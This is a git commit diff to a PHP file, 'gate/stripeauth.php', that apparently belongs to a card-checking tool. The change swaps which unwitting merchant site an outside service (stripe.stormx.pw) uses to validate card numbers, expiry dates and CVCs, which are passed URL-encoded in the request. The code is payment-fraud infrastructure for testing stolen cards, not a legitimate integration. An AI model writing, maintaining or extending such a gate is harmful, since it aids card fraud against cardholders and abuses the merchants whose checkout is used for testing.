ad66a06f0786502a2362e98bb8a604325fc1ba63
websitedeveloper07 <aadityamoga2@gmail.com>
2025-10-28 11:43:44 +0530

    Update stripeauth.php

--- gate/stripeauth.php
+++ gate/stripeauth.php
@@ -157,7 +157,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     $encoded_cc = urlencode($card_details);
     
     // API endpoint configuration
-    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=shebrews.org/cc=$encoded_cc";
+    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=funkybears.net//cc=$encoded_cc";
 
     // Initialize cURL
     $ch = curl_init();
